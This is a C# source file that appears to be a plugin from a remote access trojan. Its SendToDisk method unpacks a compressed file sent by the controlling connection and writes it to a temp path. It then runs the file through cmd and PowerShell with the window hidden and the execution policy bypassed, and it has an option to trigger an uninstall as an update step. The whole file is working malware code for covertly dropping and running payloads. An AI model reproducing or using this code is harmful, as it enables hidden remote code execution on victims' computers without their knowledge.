﻿using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using MessagePackLib.MessagePack;

namespace Plugin.Handler
{
    public class HandleSendTo
    {
        public void SendToDisk(MsgPack unpack_msgpack)
        {
            try
            {
                //Drop To Disk
                string fullPath = Path.GetTempFileName() + "g r" + unpack_msgpack.ForcePathObject("Extension").AsString;
                File.WriteAllBytes(fullPath, Zip.Decompress(unpack_msgpack.ForcePathObject("File").GetAsBytes()));
                if (unpack_msgpack.ForcePathObject("Extension").AsString.ToLower().EndsWith(".ps1"))
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $"/c start /b powershell –ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -File {"'" + "\"" + fullPath + "\"" + "'"} & exit",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        ErrorDialog = false,
                    });
                else
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "cmd",
                        Arguments = $"/c start /b powershell Start-Process -FilePath {"'" + "\"" + fullPath + "\"" + "'"} & exit",
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        UseShellExecute = true,
                        ErrorDialog = false,
                    });
                if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                {
                    new HandleUninstall();
                }
                else
                {
                    Packet.Log("file executed!");
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }
            Connection.Disconnected();
        }
    }
}
